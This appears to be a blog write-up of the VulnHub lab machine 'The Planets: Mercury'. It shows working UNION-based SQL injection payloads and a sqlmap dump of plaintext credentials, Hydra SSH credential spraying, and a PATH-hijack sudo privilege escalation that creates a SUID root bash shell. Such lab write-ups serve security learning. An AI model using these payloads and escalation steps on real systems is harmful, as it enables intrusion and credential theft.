---
title: Vulnhub, The Planets, Mercury
date: Thu Aug 15 05:19:39 PM EDT 2024
categories: [PentestNotes]
tags: [vulnhub,sqli]
---

## About Release

- **Name**: The Planets: Mercury
- **Date release**: 4 Sep 2020
- **Author**: [SirFlash](https://www.vulnhub.com/author/sirflash,731/)
- **Series**: [The Planets](https://www.vulnhub.com/series/the-planets,362/)
## Download

- **Mercury.ova** (Size: 1.6 GB)
- **Download**: [https://drive.google.com/file/d/1GkmkuZCXrSvSzTyXxQZfjpL-psqZF7Td](https://drive.google.com/file/d/1GkmkuZCXrSvSzTyXxQZfjpL-psqZF7Td)
- **Download (Mirror)**: [https://download.vulnhub.com/theplanets/Mercury.ova](https://download.vulnhub.com/theplanets/Mercury.ova)
## Description

**Difficulty**: Easy

Mercury is an easier box, with no bruteforcing required. There are two flags on the box: a user and root flag which include an md5 hash. This has been tested on VirtualBox so may not work correctly on VMware. Any questions/issues or feedback please email me at: SirFlash at protonmail.com
## Recon

```bash
└─$ ip -4 -brief address show eth0
eth0             UP             10.0.2.15/24

└─$ sudo netdiscover -i eth0 -r 10.0.2.0/24 | tee netdiscover.log
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname
 -----------------------------------------------------------------------------
 10.0.2.1        52:54:00:12:35:00      1      60  Unknown vendor
 10.0.2.2        52:54:00:12:35:00      1      60  Unknown vendor
 10.0.2.3        08:00:27:64:6e:66      1      60  PCS Systemtechnik GmbH
 10.0.2.18       08:00:27:79:c6:c3      1      60  PCS Systemtechnik GmbH
```

{::options parse_block_html="true" /}

<details>

<summary markdown="span">nmap_scan.log</summary>

```log
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
🌍HACK THE PLANET🌍

[~] The config file is expected to be at "/home/rustscan/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.
Open 10.0.2.18:22
Open 10.0.2.18:8080
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} {{ip}} -vvv -sV -sC -Pn" on ip 10.0.2.18
Depending on the complexity of the script, results may take some time to appear.
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.93 ( https://nmap.org ) at 2024-07-21 08:48 UTC
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 08:48
Completed NSE at 08:48, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 08:48
Completed NSE at 08:48, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 08:48
Completed NSE at 08:48, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 08:48
Completed Parallel DNS resolution of 1 host. at 08:48, 0.04s elapsed
DNS resolution of 1 IPs took 0.04s. Mode: Async [#: 2, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 08:48
Scanning 10.0.2.18 [2 ports]
Discovered open port 8080/tcp on 10.0.2.18
Discovered open port 22/tcp on 10.0.2.18
Completed Connect Scan at 08:48, 0.00s elapsed (2 total ports)
Initiating Service scan at 08:48
Scanning 2 services on 10.0.2.18
Completed Service scan at 08:50, 91.33s elapsed (2 services on 1 host)
NSE: Script scanning 10.0.2.18.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 08:50
Completed NSE at 08:50, 0.58s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 08:50
Completed NSE at 08:50, 1.06s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 08:50
Completed NSE at 08:50, 0.00s elapsed
Nmap scan report for 10.0.2.18
Host is up, received user-set (0.00073s latency).
Scanned at 2024-07-21 08:48:55 UTC for 94s

PORT     STATE SERVICE    REASON  VERSION
22/tcp   open  ssh        syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 c824ea2a2bf13cfa169465bdc79b6c29 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCv2kWy2C3yUkz42v3fw7LeUhH6rqOhQqqU4KNMv3Hh/25dEI3F1+BrJlimrVxH3B7WNoyAS205KACPRmvyI4I27yyXfMZ1E15D94+ZNfSE/6dG5qFNxUuJzPeVZVg3Rr2A4qMULAGQUqZAhd0vdb4QX3LyseGkigqn1POhL5wTTRCXrgAr8iWPqJxIt0AJQQvIvSZkwzHVxn1Bn7+/FMKGjimGujAIWg2GFPk1FHPjULQWgEcPCUO0z4lgaHAqZCr9xG3iSYESh0XCQnxpZA2PgrgMpaDr2QR/tklK1hRpg+eylg20UlWVPzg5BRAA+uyX3Qax3K6BCPokTSPXwN13qfgeu95G1cdE4OJhy7ENpiP/M01hfCi6cy+PhhgpN0UwbSaO1UmvmAgJjcJbHbD5hk9xuHbuzhiWdUj02ftGKwS4qG9f2EhIKwy95RKseq3p2rH9K0H8rLMRqSP9pQ8CF5aynHsdCZtWWYWh/2licfzvm0xLwAuTBljDmqicSH8=
|   256 e808a18e7d5abc5c66164824570dfab8 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBPRFXRHxQ1CAUIiG81tUpJAjV4KTvplX+pdVuqHW68CGXyVwTxPQq01UM2e7IXiYdB0oXsXn7YQAa2ti2y6FUxA=
|   256 2f187e1054f7b917a2111d8fb330a52a (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEA7N/wSYGrz/Nb9cd1KwzZfsScvv9FX1naKAxVg/Wog
8080/tcp open  http-proxy syn-ack WSGIServer/0.2 CPython/3.8.2
|_http-server-header: WSGIServer/0.2 CPython/3.8.2
| http-methods: 
|_  Supported Methods: GET HEAD OPTIONS
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
| http-robots.txt: 1 disallowed entry 
|_/
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.1 404 Not Found
|     Date: Sun, 21 Jul 2024 08:49:03 GMT
|     Server: WSGIServer/0.2 CPython/3.8.2
|     Content-Type: text/html
|     X-Frame-Options: DENY
|     Content-Length: 2366
|     X-Content-Type-Options: nosniff
|     Referrer-Policy: same-origin
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta http-equiv="content-type" content="text/html; charset=utf-8">
|     <title>Page not found at /nice ports,/Trinity.txt.bak</title>
|     <meta name="robots" content="NONE,NOARCHIVE">
|     <style type="text/css">
|     html * { padding:0; margin:0; }
|     body * { padding:10px 20px; }
|     body * * { padding:0; }
|     body { font:small sans-serif; background:#eee; color:#000; }
|     body>div { border-bottom:1px solid #ddd; }
|     font-weight:normal; margin-bottom:.4em; }
|     span { font-size:60%; color:#666; font-weight:normal; }
|     table { border:none; border-collapse: collapse; width:100%; }
|     vertical-align:
|   GetRequest, HTTPOptions: 
|     HTTP/1.1 200 OK
|     Date: Sun, 21 Jul 2024 08:49:03 GMT
|     Server: WSGIServer/0.2 CPython/3.8.2
|     Content-Type: text/html; charset=utf-8
|     X-Frame-Options: DENY
|     Content-Length: 69
|     X-Content-Type-Options: nosniff
|     Referrer-Policy: same-origin
|     Hello. This site is currently in development please check back later.
|   RTSPRequest: 
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"
|     "http://www.w3.org/TR/html4/strict.dtd">
|     <html>
|     <head>
|     <meta http-equiv="Content-Type" content="text/html;charset=utf-8">
|     <title>Error response</title>
|     </head>
|     <body>
|     <h1>Error response</h1>
|     <p>Error code: 400</p>
|     <p>Message: Bad request version ('RTSP/1.0').</p>
|     <p>Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.</p>
|     </body>
|_    </html>
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 08:50
Completed NSE at 08:50, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 08:50
Completed NSE at 08:50, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 08:50
Completed NSE at 08:50, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 95.29 seconds
```
</details>

{::options parse_block_html="false" /}

## HTTP (8000)

```bash
└─$ curl -i http://10.0.2.18:8080
HTTP/1.1 200 OK
Date: Sun, 21 Jul 2024 08:50:41 GMT
Server: WSGIServer/0.2 CPython/3.8.2
Content-Type: text/html; charset=utf-8
X-Frame-Options: DENY
Content-Length: 69
X-Content-Type-Options: nosniff
Referrer-Policy: same-origin

Hello. This site is currently in development please check back later.
```

![Writeup.png](/assets/images/Vulnhub/The-Planets-Mercury/Writeup.png)

Enumerate for files/directories:
```bash
└─$ gobuster dir -u http://10.0.2.18:8080 -w /usr/share/seclists/Discovery/Web-Content/common.txt -t 40
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
/robots.txt           (Status: 200) [Size: 26]
Progress: 4727 / 4727 (100.00%)
===============================================================
Finished
===============================================================
```

`common.txt` didn't find anything, before `raft-medium` wordlist is running let's try to check pages. If we go to invalid page we get:

![Writeup-1.png](/assets/images/Vulnhub/The-Planets-Mercury/Writeup-1.png)

We got a directory listing because of Debug mode.

### `/mercuryfacts`

![Writeup-2.png](/assets/images/Vulnhub/The-Planets-Mercury/Writeup-2.png)

```bash
└─$ curl http://10.0.2.18:8080/mercuryfacts/todo
...
        <li> Add CSS. </li>
        <li> Implement authentication (using users table)</li>
        <li> Use models in django instead of direct mysql call</li>
        <li> All the other stuff, so much!!! </li>
...
└─$ curl http://10.0.2.18:8080/mercuryfacts/1/
Fact id: 1. (('Mercury does not have any moons or rings.',),) 
```

Looks like developer is using _direct mysql calls_ which is exploitable.
### SQLi

[http://10.0.2.18:8080/mercuryfacts/1'/](http://10.0.2.18:8080/mercuryfacts/1'/)
Injecting `'` after `1` gives us SQL error:

![Writeup-3.png](/assets/images/Vulnhub/The-Planets-Mercury/Writeup-3.png)

The SQL query:
```python
cursor.execute('SELECT fact FROM facts WHERE id = ' + fact_id)
```

[swisskyrepo/PayloadsAllTheThings/SQL Injection/MySQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md#mysql-default-databases)

Get databases:
```sql
1 UNION SELECT GROUP_CONCAT(schema_name) FROM information_schema.schemata
--
Fact id: 1 UNION SELECT GROUP_CONCAT(schema_name) FROM information_schema.schemata. (('Mercury does not have any moons or rings.',), ('information_schema,mercury',))
```

Get tables:
```sql
1 UNION SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema='mercury'
--
Fact id: 1 UNION SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema='mercury'. (('Mercury does not have any moons or rings.',), ('facts,users',))
```

Get columns:
```sql
1 UNION SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='users'
---
Fact id: 1 UNION SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='users'. (('Mercury does not have any moons or rings.',), ('id,username,password',))
```

Get fields:
```sql
1 UNION SELECT GROUP_CONCAT(id,username,password) FROM mercury.users
---
Fact id: 1 UNION SELECT GROUP_CONCAT(id,username,password) FROM mercury.users. (('Mercury does not have any moons or rings.',), ('1johnjohnny1987,2lauralovemykids111,3samlovemybeer111,4webmastermercuryisthesizeof0.056Earths',))
```

### SQLMap

or just dump tables with `sqlmap`:
```bash
└─$ sqlmap -u http://10.0.2.18:8080/mercuryfacts/1 --dbms=MySQL --batch --current-db --dump
[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end users responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 05:13:12 /2024-07-21/
...
sqlmap identified the following injection point(s) with a total of 52 HTTP(s) requests:
---
Parameter: #1* (URI)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: http://10.0.2.18:8080/mercuryfacts/1 AND 3451=3451

    Type: error-based
    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
    Payload: http://10.0.2.18:8080/mercuryfacts/1 AND GTID_SUBSET(CONCAT(0x71766b6b71,(SELECT (ELT(3316=3316,1))),0x7162706b71),3316)

    Type: stacked queries
    Title: MySQL < 5.0.12 stacked queries (BENCHMARK - comment)
    Payload: http://10.0.2.18:8080/mercuryfacts/1;SELECT BENCHMARK(5000000,MD5(0x666c5666))#

    Type: time-based blind
    Title: MySQL >= 5.0.12 OR time-based blind (SLEEP)
    Payload: http://10.0.2.18:8080/mercuryfacts/1 OR SLEEP(5)

    Type: UNION query
    Title: Generic UNION query (NULL) - 1 column
    Payload: http://10.0.2.18:8080/mercuryfacts/1 UNION ALL SELECT CONCAT(0x71766b6b71,0x777866706e786359497672476555557247506171446d65596553475676554858704d53625a69576e,0x7162706b71)-- -
---
[05:15:48] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.6
[05:15:51] [INFO] fetching current database
current database: 'mercury'
[05:15:51] [WARNING] missing database parameter. sqlmap is going to use the current database to enumerate table(s) entries
[05:15:51] [INFO] fetching current database
[05:15:51] [INFO] fetching tables for database: 'mercury'
[05:15:51] [INFO] fetching columns for table 'users' in database 'mercury'
[05:15:51] [INFO] fetching entries for table 'users' in database 'mercury'
Database: mercury
Table: users
[4 entries]
+----+-------------------------------+-----------+
| id | password                      | username  |
+----+-------------------------------+-----------+
| 1  | johnny1987                    | john      |
| 2  | lovemykids111                 | laura     |
| 3  | lovemybeer111                 | sam       |
| 4  | mercuryisthesizeof0.056Earths | webmaster |
+----+-------------------------------+-----------+

[05:15:51] [INFO] table 'mercury.users' dumped to CSV file '/home/woyag/.local/share/sqlmap/output/10.0.2.18/dump/mercury/users.csv'
[05:15:51] [INFO] fetching columns for table 'facts' in database 'mercury'
[05:15:52] [INFO] fetching entries for table 'facts' in database 'mercury'
Database: mercury
Table: facts
[8 entries]
+----+--------------------------------------------------------------+
| id | fact                                                         |
+----+--------------------------------------------------------------+
| 1  | Mercury does not have any moons or rings.                    |
| 2  | Mercury is the smallest planet.                              |
| 3  | Mercury is the closest planet to the Sun.                    |
| 4  | Your weight on Mercury would be 38% of your weight on Earth. |
| 5  | A day on the surface of Mercury lasts 176 Earth days.        |
| 6  | A year on Mercury takes 88 Earth days.                       |
| 7  | Its not known who discovered Mercury.                       |
| 8  | A year on Mercury is just 88 days long.                      |
+----+--------------------------------------------------------------+

[05:15:52] [INFO] table 'mercury.facts' dumped to CSV file '/home/woyag/.local/share/sqlmap/output/10.0.2.18/dump/mercury/facts.csv'
[05:15:52] [INFO] fetched data logged to text files under '/home/woyag/.local/share/sqlmap/output/10.0.2.18'

[*] ending @ 05:15:52 /2024-07-21/
```

## Hydra

Since there's no login for web app, try users on ssh:
```bash
└─$ hydra -L usernames -P passwords 10.0.2.18 ssh
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-07-21 05:19:34
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 16 login tries (l:4/p:4), ~1 try per task
[DATA] attacking ssh://10.0.2.18:22/
[22][ssh] host: 10.0.2.18   login: webmaster   password: mercuryisthesizeof0.056Earths
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-07-21 05:19:39
```

## SSH (22)
 
### webmaster

> Creds: `webmaster:mercuryisthesizeof0.056Earths`
{: .prompt-tip }

```bash
webmaster@mercury:~$ ls -alh
total 36K
drwx------ 4 webmaster webmaster 4.0K Sep  2  2020 .
drwxr-xr-x 5 root      root      4.0K Aug 28  2020 ..
lrwxrwxrwx 1 webmaster webmaster    9 Sep  1  2020 .bash_history -> /dev/null
-rw-r--r-- 1 webmaster webmaster  220 Aug 27  2020 .bash_logout
-rw-r--r-- 1 webmaster webmaster 3.7K Aug 27  2020 .bashrc
drwx------ 2 webmaster webmaster 4.0K Aug 27  2020 .cache
drwxrwxr-x 5 webmaster webmaster 4.0K Aug 28  2020 mercury_proj
-rw-r--r-- 1 webmaster webmaster  807 Aug 27  2020 .profile
-rw-rw-r-- 1 webmaster webmaster   75 Sep  1  2020 .selected_editor
-rw------- 1 webmaster webmaster   45 Sep  1  2020 user_flag.txt
webmaster@mercury:~$ cat user_flag.txt
[user_flag_8339915c9a454657bd60ee58776f4ccd]

```
#### User.txt

```
webmaster@mercury:~$ cat user_flag.txt
[user_flag_8339915c9a454657bd60ee58776f4ccd]
```

### Privilege Escalation (linuxmaster)

No `sudo` or `suid` binaries:
```bash
webmaster@mercury:~$ sudo -l
[sudo] password for webmaster:
Sorry, user webmaster may not run sudo on mercury.
webmaster@mercury:~$ find / -perm -4000 2>/dev/null
/usr/bin/sudo
/usr/bin/gpasswd
/usr/bin/su
/usr/bin/chsh
/usr/bin/newgrp
/usr/bin/mount
/usr/bin/chfn
/usr/bin/at
/usr/bin/pkexec
/usr/bin/umount
/usr/bin/fusermount
/usr/bin/passwd
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/lib/policykit-1/polkit-agent-helper-1
```

The webapp wasn't running from `/var/www/html`, check processes:
```bash
webmaster@mercury:~/mercury_proj$ ps aux | grep python
root         495  0.0  0.8  29004 17912 ?        Ss   08:46   0:00 /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers
root         561  0.0  1.0 107828 21036 ?        Ssl  08:46   0:00 /usr/bin/python3 /usr/share/unattended-upgrades/unattended-upgrade-shutdown --wait-for-signal
webmast+     634  0.0  1.9  52336 38988 ?        S    08:46   0:00 /usr/bin/python3 /home/webmaster/mercury_proj/manage.py runserver 0:8080
webmast+     636 15.1  2.7 656308 56704 ?        Sl   08:46   5:56 /usr/bin/python3 /home/webmaster/mercury_proj/manage.py runserver 0:8080
webmast+    1597  0.0  0.0   6432   672 pts/0    S+   09:25   0:00 grep --color=auto python
webmaster@mercury:~/mercury_proj$ cat notes.txt
Project accounts (both restricted):
webmaster for web stuff - webmaster:bWVyY3VyeWlzdGhlc2l6ZW9mMC4wNTZFYXJ0aHMK
linuxmaster for linux stuff - linuxmaster:bWVyY3VyeW1lYW5kaWFtZXRlcmlzNDg4MGttCg==
```

There are notes for local users with passwords.

```bash
webmaster@mercury:~/mercury_proj$ echo 'bWVyY3VyeW1lYW5kaWFtZXRlcmlzNDg4MGttCg==' | base64 -d
mercurymeandiameteris4880km
webmaster@mercury:~/mercury_proj$ su - linuxmaster
Password:
linuxmaster@mercury:~$ id
uid=1002(linuxmaster) gid=1002(linuxmaster) groups=1002(linuxmaster),1003(viewsyslog)
```

### Privilege Escalation (root)

User is part of an extra group:
```bash
linuxmaster@mercury:~$ find / -group viewsyslog 2>/dev/null
linuxmaster@mercury:~$ sudo -l
[sudo] password for linuxmaster: 
Matching Defaults entries for linuxmaster on mercury:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User linuxmaster may run the following commands on mercury:
    (root : root) SETENV: /usr/bin/check_syslog.sh
linuxmaster@mercury:~$ cat /usr/bin/check_syslog.sh
#!/bin/bash
tail -n 10 /var/log/syslog
```

**(root : root) SETENV: /usr/bin/check_syslog.sh:** Suggests that when "linuxmaster" uses `sudo`, an environment variable is set before running the actual command.

The program also doesn't use absolute path for `tail` command and since we can manipulate env variables we can exploit PATH variable.

Expected output:
```bash
linuxmaster@mercury:~$ sudo /usr/bin/check_syslog.sh
Jul 21 09:20:53 mercury systemd[1357]: Reached target Basic System.
Jul 21 09:20:53 mercury systemd[1]: Started User Manager for UID 1001.
Jul 21 09:20:53 mercury systemd[1]: Started Session 4 of user webmaster.
Jul 21 09:20:53 mercury systemd[1357]: Reached target Main User Target.
Jul 21 09:20:53 mercury systemd[1357]: Startup finished in 528ms.
Jul 21 09:20:57 mercury systemd[1]: session-4.scope: Succeeded.
Jul 21 09:20:59 mercury systemd[1]: Started Session 6 of user webmaster.
Jul 21 09:23:18 mercury systemd[1]: proc-sys-fs-binfmt_misc.automount: Got automount request for /proc/sys/fs/binfmt_misc, triggered by 1542 (find)
Jul 21 09:23:18 mercury systemd[1]: Mounting Arbitrary Executable File Formats File System...
Jul 21 09:23:18 mercury systemd[1]: Mounted Arbitrary Executable File Formats File System.
```

```bash
linuxmaster@mercury:~$ nano tail
linuxmaster@mercury:~$ chmod u+x tail
linuxmaster@mercury:~$ cat tail
#!/bin/bash
cp /bin/bash /tmp/rootbash
chmod 4777 /tmp/rootbash

linuxmaster@mercury:~$ export PATH=.:$PATH
linuxmaster@mercury:~$ sudo --preserve-env=PATH /usr/bin/check_syslog.sh
linuxmaster@mercury:~$ /tmp/rootbash -p
rootbash-5.0# id
uid=1002(linuxmaster) gid=1002(linuxmaster) euid=0(root) groups=1002(linuxmaster),1003(viewsyslog)

```

#### Root.txt

```
rootbash-5.0# cd /root
rootbash-5.0# cat root_flag.txt
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@/##////////@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@(((/(*(/((((((////////&@@@@@@@@@@@@@
@@@@@@@@@@@((#(#(###((##//(((/(/(((*((//@@@@@@@@@@
@@@@@@@@/#(((#((((((/(/,*/(((///////(/*/*/#@@@@@@@
@@@@@@*((####((///*//(///*(/*//((/(((//**/((&@@@@@
@@@@@/(/(((##/*((//(#(////(((((/(///(((((///(*@@@@
@@@@/(//((((#(((((*///*/(/(/(((/((////(/*/*(///@@@
@@@//**/(/(#(#(##((/(((((/(**//////////((//((*/#@@
@@@(//(/((((((#((((#*/((///((///((//////(/(/(*(/@@
@@@((//((((/((((#(/(/((/(/(((((#((((((/(/((/////@@
@@@(((/(((/##((#((/*///((/((/((##((/(/(/((((((/*@@
@@@(((/(##/#(((##((/((((((/(##(/##(#((/((((#((*%@@
@@@@(///(#(((((#(#(((((#(//((#((###((/(((((/(//@@@
@@@@@(/*/(##(/(###(((#((((/((####/((((///((((/@@@@
@@@@@@%//((((#############((((/((/(/(*/(((((@@@@@@
@@@@@@@@%#(((############(##((#((*//(/(*//@@@@@@@@
@@@@@@@@@@@/(#(####(###/((((((#(///((//(@@@@@@@@@@
@@@@@@@@@@@@@@@(((###((#(#(((/((///*@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@%#(#%@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@

Congratulations on completing Mercury!!!
If you have any feedback please contact me at SirFlash@protonmail.com
[root_flag_69426d9fda579afbffd9c2d47ca31d90]
```